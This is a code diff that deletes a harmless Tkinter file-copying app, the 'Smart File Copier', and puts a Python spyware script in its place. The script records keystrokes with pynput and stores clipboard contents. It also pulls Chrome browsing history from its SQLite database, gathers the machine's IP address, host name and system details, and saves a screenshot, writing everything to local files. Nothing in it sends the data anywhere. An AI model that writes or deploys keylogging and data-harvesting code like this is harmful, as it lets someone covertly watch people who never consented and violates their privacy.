@@ -1,88 +1,104 @@
-import os
-import shutil
-import tkinter as tk
-from tkinter import filedialog, messagebox, scrolledtext
+from pynput.keyboard import Key, Listener #recording keystrokes
+import sqlite3 #get the data from a database
+import datetime #get the date
+import socket #get computer information
+import platform #get computer information
+from requests import get #get information from a website
+import win32clipboard #get clipboard information
+from PIL import ImageGrab #get screenshot
+import pandas as pd #manipulate with the aquired data
 
-class FileCopyApp:
-    def _init_(self, root):
-        self.root = root
-        self.root.title("Smart File Copier")
-        self.root.geometry("600x400")
 
-        # Source folder
-        tk.Label(root, text="Source Folder:").pack()
-        self.source_entry = tk.Entry(root, width=80)
-        self.source_entry.pack()
-        tk.Button(root, text="Browse Source", command=self.browse_source).pack()
+#records keystrokes and store it in text file
+k = []
 
-        # Destination folder
-        tk.Label(root, text="Destination Folder:").pack()
-        self.dest_entry = tk.Entry(root, width=80)
-        self.dest_entry.pack()
-        tk.Button(root, text="Browse Destination", command=self.browse_dest).pack()
+#function to record the keystroke
+def on_press(key):
+    k.append(key)
+    write_file(k)
+    print(key)
 
-        # File list
-        tk.Label(root, text="Text File with File Names:").pack()
-        self.file_entry = tk.Entry(root, width=80)
-        self.file_entry.pack()
-        tk.Button(root, text="Browse Text File", command=self.browse_file).pack()
+#function to write the data to a text file
+def write_file(var):
+    with open("logs.txt","a") as f:
+        for i in var:
+            new_var = str(i).replace("'","")
+        f.write(new_var)
+        f.write(" ")
 
-        # Run button
-        tk.Button(root, text="Run Copy", command=self.run_copy).pack(pady=10)
+#function to stop the recording       
+def on_release(key):
+    if key == Key.esc:
+        return False
 
-        # Log area
-        self.log = scrolledtext.ScrolledText(root, width=80, height=10)
-        self.log.pack()
+#listener function
+with Listener(on_press = on_press, on_release = on_release) as listener:
+    listener.join() 
 
-    def browse_source(self):
-        folder = filedialog.askdirectory()
-        if folder:
-            self.source_entry.delete(0, tk.END)
-            self.source_entry.insert(0, folder)
 
-    def browse_dest(self):
-        folder = filedialog.askdirectory()
-        if folder:
-            self.dest_entry.delete(0, tk.END)
-            self.dest_entry.insert(0, folder)
+#gets the computer information and store it in text file
 
-    def browse_file(self):
-        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
-        if file_path:
-            self.file_entry.delete(0, tk.END)
-            self.file_entry.insert(0, file_path)
+date = datetime.date.today() #get the data
 
-    def run_copy(self):
-        src = self.source_entry.get()
-        dest = self.dest_entry.get()
-        txt_file = self.file_entry.get()
+ip_address = socket.gethostbyname(socket.gethostname()) #get the IP address
 
-        if not all([src, dest, txt_file]):
-            messagebox.showwarning("Error", "Please select all paths!")
-            return
+processor = platform.processor() #get the processor details
 
-        if not os.path.exists(txt_file):
-            messagebox.showerror("Error", "Text file not found!")
-            return
+system = platform.system() #get the system details
+release = platform.release()
 
-        # Read file names
-        with open(txt_file, "r") as f:
-            file_names = [line.strip() for line in f if line.strip()]
+host_name = socket.gethostname() #get the host name
 
-        copied = 0
-        self.log.delete(1.0, tk.END)
-        for fname in file_names:
-            src_file = os.path.join(src, fname)
-            if os.path.exists(src_file):
-                shutil.copy(src_file, dest)
-                self.log.insert(tk.END, f"Copied: {fname}\n")
-                copied += 1
-            else:
-                self.log.insert(tk.END, f"Not found: {fname}\n")
+# Create a DataFrame with computer information
+data = {
+    'Metric': ['Date','IP Address', 'Processor', 'System', 'Release', 'Host Name'],
+    'Value': [date,ip_address, processor, system, release, host_name]
+}
+df = pd.DataFrame(data)
 
-        self.log.insert(tk.END, f"\nDone! Total files copied: {copied}")
+# Save the DataFrame to an Excel file
+df.to_excel('keystrokes.xlsx', index=False)
 
-if _name_ == "_main_":
-    root = tk.Tk()
-    app = FileCopyApp(root)
-    root.mainloop()
+#get the clipboard information and store it in text file
+
+def copy_clipboard():
+    current_date = datetime.datetime.now()
+    with open("clipboard.txt", "a") as f:
+        
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard() #get the clipboard data and store it in pasted_data
+
+            f.write("\n")
+            f.write("date and time:"+ str(current_date)+"\n")
+            f.write("clipboard data: \n "+ pasted_data) #write the clipboard data into the text file
+        
+copy_clipboard()
+
+
+
+#get history of google chrome
+
+conn = sqlite3.connect('C:\\Users\\username\\Desktop\\history1') #connect to the google chrome history database "add your path"
+cursor = conn.cursor()
+
+# Retrieve search history from the database accordingly
+cursor.execute("SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') AS last_visit_time FROM urls")
+search_history = cursor.fetchall()
+
+# Create a pandas DataFrame from the retrieved search history
+df = pd.DataFrame(search_history, columns=['url', 'title', 'Timestamp'])
+
+# Save the search history DataFrame to an Excel file
+excel_file = "search_history.xlsx"
+df.to_excel(excel_file, index=False)
+
+# Close the database connection
+conn.close()
+
+#get the screenshot
+def screenshot():
+    im = ImageGrab.grab()
+    im.save("screenshot.png")
+
+screenshot()
